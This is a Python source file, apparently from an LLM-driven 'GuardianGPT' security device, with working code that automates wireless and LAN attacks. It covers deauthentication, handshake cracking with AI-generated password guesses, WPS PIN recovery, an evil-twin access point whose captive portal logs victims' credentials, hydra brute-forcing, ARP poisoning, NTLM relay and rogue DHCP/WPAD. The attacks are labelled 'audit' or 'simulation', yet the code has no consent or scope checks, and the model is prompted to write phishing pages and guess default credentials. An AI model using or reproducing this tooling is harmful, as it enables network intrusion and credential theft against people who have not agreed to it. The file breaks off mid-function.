    def setup_llm(self, model="qwen2.5-0.5B-int8-ax630c", prompt="You are GuardianGPT, a cybersecurity AI. Analyze network data and provide security recommendations. Respond ONLY with a single, valid JSON object."):
        init_data = {
            "request_id": str(uuid.uuid4()),
            "work_id": "llm",
            "action": "setup",
            "object": "llm.setup",
            "data": { "model": model, "response_format": "llm.utf-8.stream", "input": "llm.utf-8.stream", "enoutput": True, "max_token_len": 2048, "prompt": prompt }
        }
        resp = self._send_and_receive_json(init_data)
        if resp and isinstance(resp, dict) and isinstance(resp.get("error", {}), dict) and resp.get("error", {}).get("code") == 0:
            self.llm_work_id = resp.get("work_id")
            if self.llm_work_id:
                update_status(f"LLM session initialized with work_id: {self.llm_work_id}", "AI Init")
                return True
        
        error_details = resp.get('error', 'Unknown error') if (resp and isinstance(resp, dict) and hasattr(resp, 'get')) else 'No response'
        update_status(f"LLM Setup Error: {error_details}", "Error")
        return False

    # --- get_llm_inference Function ---
    # Sends a user prompt to the LLM for inference and streams the response.
    # It handles chunked responses and attempts to parse the full response as JSON.
    def get_llm_inference(self, user_prompt):
        if not self.llm_work_id:
            update_status("LLM session not initialized, cannot run inference.", "Error")
            return None

        req = { "request_id": str(uuid.uuid4()), "work_id": self.llm_work_id, "action": "inference", "object": "llm.utf-8.stream", "data": {"delta": user_prompt, "index": 0, "finish": True} }
        
        response = self._send_and_receive_json(req)
        if not response:
            update_status("LLM inference request failed (no initial response).", "Error")
            return None

        # The original code had a streaming loop that was incompatible with ZMQ REQ sockets.
        # It has been corrected to process a single, complete response.
        full_response = ""
        if 'data' in response and 'delta' in response['data']:
            full_response = response['data']['delta']
        else:
            # If the structure is different, let's try to find the response string.
            # This handles cases where the response might not be in data.delta.
            if isinstance(response.get('data'), str):
                full_response = response['data']
            elif isinstance(response, str):
                 full_response = response

        if not full_response:
            update_status("Received empty or malformed response from LLM.", "Warning")
            return None

        try:
            return json.loads(full_response)
        except json.JSONDecodeError:
            update_status(f"Could not parse JSON from LLM response: {full_response}", "Error")
            m = re.search(r'\{.*\}', full_response, re.DOTALL)
            if m:
                try: return json.loads(m.group(0))
                except json.JSONDecodeError: update_status("Fallback JSON parsing also failed.", "Error")
            return None

    # --- close Function ---
    # Closes the LLM session and terminates the ZMQ context, releasing resources.
    def close(self):
        if self.llm_work_id:
            self._send_and_receive_json({"request_id": "llm_exit", "work_id": self.llm_work_id, "action": "exit"})
        if self.socket:
            self.socket.close()
        self.context.term()

# --- Core Security & Analysis Modules ---
# --- Core Security & Analysis Modules ---

# WiFiSecurityModule Class
class WiFiSecurityModule(ToolManager):
    """
    Manages Wi-Fi related security operations, including network scanning,
    monitor mode setup, handshake capture, WPS auditing, and rogue AP simulation.
    """
    # --- Constructor ---
    # Initializes the module with the specified Wi-Fi interface and ensures
    # that necessary tools (airmon-ng, airodump-ng, etc.) are available.
    def __init__(self, interface):
        self.interface = interface
        self._ensure_tools(["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "nmcli", "iw", "reaver", "hostapd", "dnsmasq"], PACKAGE_MAPPINGS)

    # --- set_monitor_mode Function ---
    # Enables or disables monitor mode on the specified Wi-Fi interface.
    # Monitor mode is necessary for passive network scanning and packet capture.
    def set_monitor_mode(self, enable=True):
        try:
            if enable:
                subprocess.run(["airmon-ng", "check", "kill"], check=False, capture_output=True)
                subprocess.run(["airmon-ng", "start", self.interface], check=True, capture_output=True, timeout=30)
                guardian_state["wireless_mode"] = "monitor"
                update_status(f"Monitor mode enabled on {self.interface}", "Wi-Fi")
            else:
                subprocess.run(["airmon-ng", "stop", self.interface], check=True, capture_output=True, timeout=30)
                subprocess.run(["service", "NetworkManager", "start"], check=False, capture_output=True)
                guardian_state["wireless_mode"] = "managed"
                update_status(f"Monitor mode disabled on {self.interface}", "Wi-Fi")
            return True
        except Exception as e:
            update_status(f"Failed to set monitor mode: {e}", "Error")
            return False

    # --- scan_wifi_networks Function ---
    # Scans for nearby Wi-Fi networks using `airodump-ng` and parses the output
    # to extract network details like SSID, BSSID, encryption, signal strength, and connected clients.
    def scan_wifi_networks(self):
        if guardian_state["wireless_mode"] != "monitor" and not self.set_monitor_mode(True):
            return []
        update_status("Scanning for Wi-Fi networks...", "Wi-Fi Scan")
        try:
            cmd = ["airodump-ng", "--output-format", "csv", "--write", "/tmp/wifi_scan", self.interface]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            networks = []
            for line in proc.stdout.split('\n'):
                if ',' in line and not line.startswith('BSSID'):
                    parts = line.split(',')
                    if len(parts) >= 14:
                        networks.append({
                            "ssid": parts[13].strip(),
                            "bssid": parts[0].strip(),
                            "channel": parts[3].strip(),
                            "encryption": parts[5].strip(),
                            "signal": parts[8].strip()
                        })
            update_status(f"Found {len(networks)} networks", "Wi-Fi Scan")
            return networks
        except Exception as e:
            update_status(f"Wi-Fi scan failed: {e}", "Error")
            return []

    # --- capture_handshake_for_audit Function ---
    # Captures a WPA/WPA2 handshake for a given SSID and BSSID using `airodump-ng`
    # and `aireplay-ng`. This handshake is then used for password strength analysis.
    def capture_handshake_for_audit(self, ssid, bssid, channel):
        if guardian_state["wireless_mode"] != "monitor" and not self.set_monitor_mode(True): return None
        update_status(f"Capturing handshake for {ssid} to audit password strength...", "Wi-Fi Audit", ssid)
        path = os.path.join(SD_CARD_LOG_PATH, f"{ssid}_handshake")
        try:
            dump_cmd = ["airodump-ng", "--bssid", bssid, "--channel", str(channel), "-w", path, self.interface]
            dump_proc = subprocess.Popen(dump_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(5)
            subprocess.run(["aireplay-ng", "-0", "5", "-a", bssid, self.interface], check=True, capture_output=True, timeout=30)
            time.sleep(10)
            dump_proc.terminate(); dump_proc.wait(timeout=5)
            cap_file = f"{path}-01.cap"
            if os.path.exists(cap_file) and os.path.getsize(cap_file) > 0: return cap_file
            return None
        except Exception as e:
            update_status(f"Handshake capture failed: {e}", "Error"); return None

    # --- audit_wps Function ---
    # Audits a Wi-Fi network for WPS vulnerabilities using `reaver`.
    # If a WPS PIN or WPA PSK is recovered, it indicates a vulnerability.
    def audit_wps(self, bssid):
        update_status(f"Starting WPS vulnerability audit on {bssid}...", "Wi-Fi Audit", bssid)
        try:
            cmd = ["reaver", "-i", self.interface, "-b", bssid, "-vv", "-K", "1"]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=WPS_AUDIT_TIMEOUT)
            pin_match = re.search(r"WPS PIN: '(\d+)'", proc.stdout)
            pass_match = re.search(r"WPA PSK: '(.+)'", proc.stdout)
            if pass_match:
                update_status(f"WPS is vulnerable on {bssid}. Password recovered. Recommend disabling WPS.", "Vulnerability Found")
                return pass_match.group(1)
            if pin_match:
                update_status(f"WPS PIN found: {pin_match.group(1)}. Re-running to get PSK.", "Wi-Fi Audit")
                proc = subprocess.run(cmd + ["-p", pin_match.group(1)], capture_output=True, text=True, timeout=300)
                pass_match = re.search(r"WPA PSK: '(.+)'", proc.stdout)
                if pass_match: return pass_match.group(1)
            update_status(f"WPS audit on {bssid} complete. No vulnerabilities found.", "Wi-Fi Audit")
            return None
        except Exception as e:
            update_status(f"WPS audit failed: {e}", "Error")
            return None

    # --- simulate_rogue_ap Function ---
    # Simulates a rogue access point (Evil Twin) attack using `hostapd` and `dnsmasq`.
    # This tests the network's resilience against credential harvesting.
    def simulate_rogue_ap(self, ssid, channel, llm_client, real_bssid=None):
        update_status(f"Simulating Rogue AP for {ssid} to test network resilience...", "Simulation", ssid)
        temp_dir = tempfile.gettempdir()
        hostapd_conf_path = os.path.join(temp_dir, "hostapd_rogue.conf")
        dnsmasq_conf_path = os.path.join(temp_dir, "dnsmasq_rogue.conf")
        
        hostapd_conf = f"interface={self.interface}\ndriver=nl80211\nssid={ssid}\nchannel={channel}\nhw_mode=g\n"
        dnsmasq_conf = f"interface={self.interface}\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1\naddress=/#/10.0.0.1\n"
        try:
            with open(hostapd_conf_path, "w") as f: f.write(hostapd_conf)
            with open(dnsmasq_conf_path, "w") as f: f.write(dnsmasq_conf)
            subprocess.run(["ip", "addr", "flush", "dev", self.interface], check=True)
            subprocess.run(["ip", "addr", "add", "10.0.0.1/24", "dev", self.interface], check=True)
            # --- DEAUTH step: force clients off the real AP ---
            if real_bssid:
                try:
                    update_status(f"Sending deauth packets to {real_bssid} to force clients to Evil Twin...", "Deauth")
                    subprocess.run(["aireplay-ng", "-0", "10", "-a", real_bssid, self.interface], check=True, capture_output=True, timeout=30)
                except Exception as e:
                    update_status(f"Deauth step failed: {e}", "Warning")
            subprocess.Popen(["hostapd", hostapd_conf_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.Popen(["dnsmasq", "-C", dnsmasq_conf_path, "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.simulate_captive_portal(llm_client, ssid)
            update_status("Rogue AP simulation and captive portal are active.", "Simulation")
            return True
        except Exception as e:
            update_status(f"Rogue AP simulation failed: {e}", "Error")
            return False

    # --- simulate_captive_portal Function ---
    # Generates and serves a simulated captive portal login page using Flask.
    # This is part of the rogue AP simulation to capture credentials.
    def simulate_captive_portal(self, llm_client, target_ssid):
        prompt = f"Generate complete HTML/CSS for a captive portal login page for a Wi-Fi network named '{target_ssid}'. The form should POST to '/login'. This is for a security simulation. Respond ONLY with HTML."
        portal_html = llm_client.get_llm_inference(prompt)
        if not portal_html or not isinstance(portal_html, str):
            portal_html = f"<html><body><h1>Login to {target_ssid}</h1><form method='post' action='/login'><input name='username' placeholder='Username'><input name='password' type='password' placeholder='Password'><button type='submit'>Log In</button></body></html>"
        
        # Use a simple HTTP server instead of Flask to avoid conflicts
        import http.server
        import socketserver
        
        class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                if self.path == '/':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(portal_html.encode())
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def do_POST(self):
                if self.path == '/login':
                    content_length = int(self.headers['Content-Length'])
                    post_data = self.rfile.read(content_length).decode()
                    # Parse form data
                    creds = {}
                    for pair in post_data.split('&'):
                        if '=' in pair:
                            key, value = pair.split('=', 1)
                            creds[key] = value
                    
                    update_status(f"Captive portal simulation captured credentials: {json.dumps(creds)}", "Simulation Result")
                    log_to_sd_card("rogue_ap_credentials.log", json.dumps(creds))
                    
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(b"<h3>Connection Successful! This was a security test.</h3>")
                else:
                    self.send_response(404)
                    self.end_headers()
        
        def run_portal():
            try:
                with socketserver.TCPServer(("", 80), CaptivePortalHandler) as httpd:
                    httpd.serve_forever()
            except Exception as e:
                update_status(f"Captive portal simulation failed: {e}", "Error")
            
        threading.Thread(target=run_portal, daemon=True).start()

    # --- connect_to_network Function ---
    # Connects the device to a specified Wi-Fi network using `nmcli`.
    # It can handle both open and password-protected networks.
    def connect_to_network(self, ssid, password=None):
        if guardian_state["wireless_mode"] == "monitor": self.set_monitor_mode(enable=False); time.sleep(5)
        update_status(f"Connecting to {ssid}...", "Connecting", ssid)
        try:
            cmd = ["nmcli", "device", "wifi", "connect", ssid]
            if password: cmd.extend(["password", password])
            subprocess.run(cmd, check=True, capture_output=True, timeout=30)
            update_status(f"Successfully connected to {ssid}", "Connected", ssid)
            return True
        except Exception as e:
            update_status(f"Failed to connect to {ssid}: {e}", "Error")
            return False

# PasswordStrengthAnalyzer Class
class PasswordStrengthAnalyzer:
    """
    Analyzes password strength for Wi-Fi networks and SSH credentials.
    It leverages the LLM to generate intelligent password guesses and
    manages a dynamic password list.
    """
    # --- Constructor ---
    # Initializes the analyzer with the AI model path, LLM client,
    # and loads common and AI-generated passwords.
    def __init__(self, model_path, llm_client):
        self.model_path = model_path
        self.llm_client = llm_client
        self.sd_password_file = "/mnt/sdcard/assets/ai_generated_passwords.txt"
        self.common_passwords = self._load_common_passwords()

    # --- get_mac_vendor Function ---
    # Attempts to retrieve the MAC address and vendor information for a given IP address
    # using Nmap. This information can be used to inform AI-driven credential guessing.
    def get_mac_vendor(self, host_ip: str) -> str:
        try:
            nm = nmap.PortScanner()
            nm.scan(hosts=host_ip, arguments='-sn')
            if host_ip not in nm.all_hosts():
                return "unknown"
            host_info = nm[host_ip]
            if not host_info:
                return "unknown"
            addresses = host_info.get('addresses')
            if not addresses:
                return "unknown"
            mac = addresses.get('mac', 'unknown')
            if mac != 'unknown':
                vendor = host_info.get('vendor', {}).get(mac, 'unknown')
                return f"{mac} ({vendor})" if vendor != 'unknown' else mac
            return "unknown"
        except Exception:
            return "unknown"

    # --- propose_ssh_creds Function ---
    # Queries the LLM to propose likely weak or default SSH username/password combinations
    # for a given host IP, considering its MAC vendor information.
    def propose_ssh_creds(self, host_ip: str) -> list[tuple[str,str]]:
        update_status(f"Asking AI for likely weak SSH creds for {host_ip}...", "AI Inference")
        mac_vendor = self.get_mac_vendor(host_ip)
        prompt = (
            f"You are GuardianGPT. Suggest the 5 most likely weak or default SSH login "
            f"username/password combinations for a Linux host at {host_ip} "
            f"with manufacturer info: {mac_vendor}. Consider common defaults. "
            "Respond ONLY with JSON: [{\"user\":\"root\",\"pass\":\"toor\"}, {\"user\":\"admin\",\"pass\":\"password\"}]"
        )
        result = self.llm_client.get_llm_inference(prompt)
        if isinstance(result, list):
            try:
                pairs = [(item["user"], item["pass"]) for item in result if "user" in item and "pass" in item]
                update_status(f"AI proposed {len(pairs)} weak SSH creds for {host_ip}.", "AI Inference")
                return pairs
            except Exception as e:
                update_status(f"Error parsing AI SSH creds: {e}. Raw: {result}", "Error")
        update_status(f"AI did not provide valid SSH creds for {host_ip}. Falling back to static list.", "Warning")
        return []

    # --- _load_common_passwords Function (Private) ---
    # Loads common passwords from a local file and dynamically generated passwords
    # from a file on the SD card, combining them into a single list.
    def _load_common_passwords(self):
        os.makedirs(os.path.dirname(self.sd_password_file), exist_ok=True)
        passwords = set()
        try:
            local_path = os.path.join(self.model_path, "common_passwords.txt")
            with open(local_path, 'r') as f:
                for line in f:
                    if line.strip(): passwords.add(line.strip())
            update_status("Loaded base passwords from local assets.", "Init")
        except Exception as e:
            update_status(f"Could not load base passwords: {e}", "Warning")
        try:
            update_status(f"Loading dynamically generated passwords from {self.sd_password_file}", "Init")
            with open(self.sd_password_file, 'a+') as f:
                f.seek(0)
                for line in f:
                    if line.strip(): passwords.add(line.strip())
        except Exception as e:
            update_status(f"Failed to load or create password file on SD card: {e}", "Error")
        return list(passwords)

    # --- generate_ai_guesses Function ---
    # Uses the LLM to generate a list of likely password candidates based on a given context (e.g., SSID).
    # These new guesses are appended to the SD card password file for future use.
    def generate_ai_guesses(self, context, num_guesses=50):
        update_status(f"Generating {num_guesses} AI password guesses for '{context}'...", "Password Analysis")
        prompt = f"Generate a JSON list of {num_guesses} likely password candidates for a Wi-Fi network with the SSID '{context}'. Respond ONLY with a JSON array of strings."
        response_json = self.llm_client.get_llm_inference(prompt)
        ai_guesses = response_json if isinstance(response_json, list) else [f"{context}123", f"admin{context}"]
        try:
            existing_passwords = set(self.common_passwords)
            new_guesses = [p for p in ai_guesses if p not in existing_passwords]
            if new_guesses:
                with open(self.sd_password_file, 'a') as f:
                    for guess in new_guesses:
                        f.write(guess + '\n')
                update_status(f"Appended {len(new_guesses)} new passwords to SD card file.", "Password Analysis")
                self.common_passwords.extend(new_guesses)
        except Exception as e:
            update_status(f"Failed to write AI guesses to SD card: {e}", "Error")
        return ai_guesses

    # --- verify_wpa2_password Function ---
    # Verifies if a given password is correct for a WPA2 network using `aircrack-ng`
    # and a captured handshake file.
    def verify_wpa2_password(self, handshake_file, ssid, password):
        tmp_wordlist = "/tmp/temp_candidate.txt"
        try:
            with open(tmp_wordlist, "w") as f: f.write(password + "\n")
            cmd = ["aircrack-ng", "-w", tmp_wordlist, "-e", ssid, handshake_file]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return "KEY FOUND!" in proc.stdout
        except Exception: return False
        finally:
            if os.path.exists(tmp_wordlist): os.remove(tmp_wordlist)

    # --- analyze_handshake Function ---
    # Analyzes a captured WPA2 handshake file by attempting to crack the password
    # using both common passwords and AI-generated guesses.
    def analyze_handshake(self, handshake_file, ssid):
        update_status(f"Starting password strength analysis for {ssid}...", "Password Analysis", ssid)
        for password in self.common_passwords:
            if guardian_state["stop_signal"].is_set(): return None
            if self.verify_wpa2_password(handshake_file, ssid, password):
                return password
        ai_guesses = self.generate_ai_guesses(context=ssid)
        for password in ai_guesses:
            if guardian_state["stop_signal"].is_set(): return None
            if self.verify_wpa2_password(handshake_file, ssid, password):
                return password
        return None

# LanAnalyzer Class
class LanAnalyzer(ToolManager):
    """
    Performs internal network analysis, including host discovery, port scanning,
    vulnerability scanning, credential testing, and various network attack simulations.
    """
    # --- Constructor ---
    # Initializes the analyzer with the specified network interface and ensures
    # that necessary tools (nmap, arpspoof, nikto, hydra, smbclient) are available.
    def __init__(self, interface):
        self.interface = interface
        self._ensure_tools(["nmap", "ip", "arpspoof", "nikto", "hydra", "smbclient", "dhcpd"], PACKAGE_MAPPINGS)

    # --- get_local_ip_and_subnet Function ---
    # Retrieves the local IP address and subnet in CIDR format for the specified interface.
    def get_local_ip_and_subnet(self):
        try:
            result = subprocess.run(["ip", "addr", "show", self.interface], capture_output=True, text=True, check=True)
            ip_match = re.search(r"inet (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2})", result.stdout)
            if ip_match:
                ip_with_cidr = ip_match.group(1)
                ip_address, _ = ip_with_cidr.split('/')
                return ip_address, ip_with_cidr
            return None, None
        except Exception: return None, None

    # --- run_nmap_scan Function ---
    # Executes a deep Nmap scan (`-sV`, `-sC`, `-O`) on a target IP range to discover
    # hosts, open ports, services, and operating systems. Updates the global state with findings.
    def run_nmap_scan(self, target_ip_range):
        update_status(f"Running deep Nmap scan on {target_ip_range}...", "Discovery")
        found_hosts = {}
        try:
            command = ["nmap", "-sV", "-sC", "-O", "-T4", "-oX", "-", target_ip_range]
            process = subprocess.run(command, capture_output=True, text=True, check=True, timeout=NMAP_SCAN_TIMEOUT)
            root = ET.fromstring(process.stdout)
            for host in root.findall('host'):
                ip_elem = host.find("address[@addrtype='ipv4']")
                if ip_elem is None:
                    continue
                ip = ip_elem.get('addr')
                if ip is None:
                    continue
                os_match = host.find("os/osmatch")
                os_name = os_match.get('name') if os_match is not None else "Unknown"
                ports = {}
                for p in host.findall("ports/port"):
                    service = p.find('service')
                    if service is not None:
                        ports[p.get('portid')] = {
                            "service": service.get('name', 'unknown'),
                            "product": service.get('product', 'unknown'),
                            "version": service.get('version', 'unknown')
                        }
                found_hosts[ip] = {"os": os_name, "ports": ports, "vulnerabilities": {}, "credentials": {}, "shares": []}
            guardian_state["analyzed_hosts"].update(found_hosts)
            return found_hosts
        except Exception as e:
            update_status(f"Nmap scan failed: {e}", "Error")
            return {}

    # --- run_nikto_scan Function ---
    # Performs a Nikto web vulnerability scan against a specified target IP and port.
    # Logs the results to the SD card and updates the global state.
    def run_nikto_scan(self, target_ip, port):
        update_status(f"Running Nikto vulnerability scan on {target_ip}:{port}...", "Vulnerability Scan")
        try:
            command = ["nikto", "-h", f"http://{target_ip}:{port}", "-Tuning", "x", "6", "-output", "-"]
            process = subprocess.run(command, capture_output=True, text=True, timeout=NIKTO_SCAN_TIMEOUT)
            if target_ip in guardian_state["analyzed_hosts"]:
                guardian_state["analyzed_hosts"][target_ip]["vulnerabilities"][port] = process.stdout
            log_to_sd_card(f"nikto_{target_ip}_{port}.log", process.stdout)
            update_status(f"Nikto scan on {target_ip}:{port} complete.", "Vulnerability Scan")
            return process.stdout
        except Exception as e:
            update_status(f"Nikto scan failed: {e}", "Error")
            return None

    # --- test_service_credentials Function ---
    # Tests the strength of service logins (e.g., SSH, FTP) on a target device
    # using `hydra` with a provided password list. Reports any weak credentials found.
    def test_service_credentials(self, target_ip, port, service, password_list):
        update_status(f"Starting credential strength test on {target_ip}:{port} ({service})...", "Credential Test")
        temp_dir = tempfile.gettempdir()
        pass_file = os.path.join(temp_dir, "hydra_pass.txt")
        user_list = os.path.join(temp_dir, "hydra_users.txt")
        try:
            # Create user list file
            with open(user_list, "w") as f:
                f.write("admin\nroot\nuser\n")
            # Create password file
            with open(pass_file, "w") as f:
                for cred in password_list:
                    f.write(f"{cred}\n")
            cmd = ["hydra", "-L", user_list, "-P", pass_file, "-s", port, f"{service}://{target_ip}"]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=HYDRA_TIMEOUT)
            creds_match = re.search(r"login: (\S+)\s+password: (\S+)", proc.stdout)
            if creds_match:
                username = creds_match.group(1)
                password = creds_match.group(2)
                update_status(f"VULNERABILITY: Weak credentials found for {service} on {target_ip} - {username}:{password}", "Vulnerability Found")
                if target_ip in guardian_state["analyzed_hosts"]:
                    guardian_state["analyzed_hosts"][target_ip]["credentials"][service] = f"{username}:{password}"
                return f"{username}:{password}"
            else:
                update_status(f"Credential test on {target_ip}:{port} completed. No weak credentials found.", "Credential Audit")
                return None
        except Exception as e:
            update_status(f"Credential test failed: {e}", "Error")
            return None
        finally:
            if os.path.exists(pass_file): os.remove(pass_file)

    # --- enumerate_smb_shares Function ---
    # Enumerates open Server Message Block (SMB) shares on a target IP using `smbclient`.
    # This helps identify potential unauthorized data access points.
    def enumerate_smb_shares(self, target_ip):
        update_status(f"Enumerating SMB shares on {target_ip}...", "Discovery")
        try:
            cmd = ["smbclient", "-L", f"//{target_ip}", "-N"]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            shares = re.findall(r"^\s+(Disk\s+.+?)\s+", proc.stdout, re.MULTILINE)
            if shares and target_ip in guardian_state["analyzed_hosts"]:
                guardian_state["analyzed_hosts"][target_ip]["shares"] = shares
                update_status(f"Found open SMB shares on {target_ip}: {shares}. Recommend restricting access.", "Vulnerability Found")
            return shares
        except Exception as e:
            update_status(f"SMB enumeration failed: {e}", "Error")
            return []

    # --- simulate_arp_poisoning Function ---
    # Simulates an ARP (Address Resolution Protocol) poisoning attack between a target IP
    # and the gateway IP using `arpspoof`. This tests the network's defenses against
    # Man-in-the-Middle (MITM) attacks.
    def simulate_arp_poisoning(self, target_ip, gateway_ip):
        update_status(f"Simulating ARP poisoning between {target_ip} and {gateway_ip} to test resilience...", "MITM Simulation")
        try:
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
            target_proc = subprocess.Popen(["arpspoof", "-i", self.interface, "-t", target_ip, gateway_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            gw_proc = subprocess.Popen(["arpspoof", "-i", self.interface, "-t", gateway_ip, target_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            guardian_state["mitm_simulation"] = { "target_ip": target_ip, "gateway_ip": gateway_ip, "processes": [target_proc.pid, gw_proc.pid] }
            update_status(f"ARP poisoning simulation active between {target_ip} and {gateway_ip}", "MITM Simulation")
            return True
        except Exception as e:
            update_status(f"ARP poisoning simulation failed: {e}", "Error")
            return False

    # --- get_wan_ip Function ---
    # Retrieves the public (WAN) IP address of the device by querying an external service.
    def get_wan_ip(self):
        update_status("Determining WAN IP address...", "Discovery")
        try:
            result = subprocess.run(["curl", "-s", "https://api.ipify.org"], capture_output=True, text=True, check=True, timeout=10)
            wan_ip = result.stdout.strip()
            guardian_state["wan_ip"] = wan_ip
            update_status(f"WAN IP: {wan_ip}", "Discovery")
            return wan_ip
        except Exception as e:
            update_status(f"Failed to get WAN IP: {e}", "Error")
            return None

    # --- _load_audit_history Function (Private) ---
    # Loads the audit history from a JSON file on the SD card.
    def _load_audit_history(self):
        history_file = os.path.join(SD_CARD_LOG_PATH, "audit_history.json")
        try:
            if os.path.exists(history_file):
                with open(history_file, 'r') as f:
                    loaded = json.load(f)
                    if loaded is not None:
                        return loaded
        except Exception:
            pass
        return []

    # --- _calculate_success_rates Function (Private) ---
    # Calculates the success rates of different audit actions from the audit history.
    def _calculate_success_rates(self, history):
        if not history: return {}
        success_counts, total_counts = {}, {}
        for entry in history:
            audit_type = entry.get('action')
            if audit_type:
                total_counts[audit_type] = total_counts.get(audit_type, 0) + 1
                if entry.get('success'):
                    success_counts[audit_type] = success_counts.get(audit_type, 0) + 1
        return { t: (success_counts.get(t, 0) / total_counts[t]) for t in total_counts }

    # --- simulate_ntlm_relay Function ---
    # Simulates an NTLMv2 relay attack against specified targets using `impacket`.
    # This tests the network's vulnerability to credential relaying.
    def simulate_ntlm_relay(self, targets: list[str]):
        update_status(f"Simulating NTLMv2 relay against {targets} to test for vulnerability", "Simulation")
        try:
            # The original implementation of this feature was broken due to incorrect impacket usage.
            # Switching to a subprocess call to the ntlmrelayx.py script.
            target_file = "/tmp/ntlm_targets.txt"
            with open(target_file, "w") as f:
                for target in targets:
                    f.write(target + "\n")
            
            # Assuming ntlmrelayx.py is in a directory in the system's PATH
            cmd = ["ntlmrelayx.py", "-tf", target_file, "-smb2support"]
            
            # Run in background
            subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            update_status(f"ntlmrelayx.py started in background against targets in {target_file}", "Simulation")
            return True
        except FileNotFoundError:
            update_status("Error: ntlmrelayx.py not found in PATH. Cannot simulate NTLM relay.", "Error")
            return False
        except Exception as e:
            update_status(f"Failed to start NTLM relay simulation: {e}", "Error")
            return False

    # --- simulate_dhcp_wpad_spoof Function ---
    # Simulates a rogue DHCP server and WPAD (Web Proxy Auto-Discovery) spoofing attack.
    # This tests the network's resilience against traffic redirection and proxy hijacking.
    def simulate_dhcp_wpad_spoof(self, rogue_dns: str | None = None):
        dns = rogue_dns if rogue_dns is not None else guardian_state.get("wan_ip", "8.8.8.8")
        update_status("Simulating rogue DHCP & WPAD to test resilience", "Simulation")
        temp_dir = tempfile.gettempdir()
        dhcp_conf_path = os.path.join(temp_dir, "dhcpd.conf")
        dhcp_conf = f"default-lease-time 600;\nmax-lease-time 7200;\nauthoritative;\nsubnet 10.0.0.0 netmask 255.255.255.0 {{\n  range 10.0.0.50 10.0.0.200;\n  option routers 10.0.0.1;\n  option domain-name-servers {dns};\n  option wpad.url \"http://{dns}/wpad.dat\";\n}}"
        with open(dhcp_conf_path, "w") as f: f.write(dhcp_conf)
        if isinstance(self.interface, str) and self.interface:
            subprocess.Popen(["sudo", "dhcpd", "-cf", dhcp_conf_path, self.interface])
        else:
            update_status("DHCP simulation failed: interface is None or not a string", "Error")
            return False
        update_status("Rogue DHCP simulation is up", "Simulation")
        return True

    # --- masscan_scan Function ---
    # Performs a high-speed port scan using `masscan` on a given CIDR range.
    # This is useful for quickly identifying open ports across a large network segment.
    def masscan_scan(self, cidr: str, rate: int = 100000):
        update_status(f"Running masscan on {cidr} @ {rate}pps", "Discovery (masscan)")
        temp_dir = tempfile.gettempdir()
        out = os.path.join(temp_dir, "masscan.json")
        cmd = ["masscan", cidr, "-p1-65535", f"--rate={rate}", "-oJ", out]
        subprocess.run(cmd, check=True, timeout=60)
        with open(out) as f: results = json.load(f)
        update_status(f"masscan returned {len(results)} entries", "Discovery (masscan)")
        return results

# --- Web Dashboard (Flask) & Main Entry Point ---
web_app = Flask(__name__)

@web_app.route('/')
def index(): return render_template('dashboard.html')

@web_app.route('/status')
def get_status():
    # Create a serializable copy of guardian_state, excluding threading.Event
    serializable_state = guardian_state.copy()
    serializable_state["stop_signal"] = None  # Remove threading.Event
    return jsonify(serializable_state)

# Global variable for the AI orchestrator
ai_orchestrator = None

@web_app.route('/command', methods=['POST'])
def handle_command():
    global ai_orchestrator
    if not request.json:
        return jsonify({"status": "Invalid JSON"}), 400
    command = request.json.get('command')
    if command == "start_ai" and not guardian_state["ai_running"]:
        guardian_state["stop_signal"].clear()
        if ai_orchestrator:
            threading.Thread(target=ai_orchestrator.ai_guardian_loop, daemon=True).start()
        return jsonify({"status": "AI Guardian started"})
    elif command == "stop_ai" and guardian_state["ai_running"]:
        guardian_state["stop_signal"].set()
        guardian_state["ai_running"] = False
        return jsonify({"status": "AI Guardian stopping"})
    return jsonify({"status": "Invalid command or state"}), 400

if __name__ == "__main__":
    # Validate configuration
    try:
        validate_config()
    except ValueError as e:
        print(f"[FATAL] Configuration error: {e}")
        sys.exit(1)

    load_state()
    llm_client = StackFlowClient(LLM_ZMQ_ENDPOINT)
    
    # New initialization sequence: reset the system, then set up the LLM.
    if not llm_client.reset_system() or not llm_client.setup_llm():
        update_status("Critical: Unable to initialize LLM630. Check StackFlow service. Exiting.", "Error")
        llm_client.close()
        exit(1)
        
    # Initialize global ai_orchestrator
    ai_orchestrator = AIAnalysisOrchestrator(llm_client, rpc_pass=MSF_RPC_PASSWORD)
    
    update_status("Starting Web Dashboard...", "UI Init")
    web_app.run(host=WEB_HOST, port=WEB_PORT, debug=WEB_DEBUG)

# --- System Tool Wrappers ---
# Use tool configuration from config.py

def run_tool(tool_name, args=None):
    """Generic tool runner that replaces all individual run_* functions"""
    if tool_name not in TOOL_TIMEOUTS:
        update_status(f"Unknown tool: {tool_name}", "Error")
        return None
    
    timeout = TOOL_TIMEOUTS[tool_name]
    cmd = [tool_name] + (args or [])
    
    try:
        # Special handling for tools that need Popen
        if tool_name in ['arpwatch', 'evilginx2', 'setoolkit']:
            return subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except Exception as e:
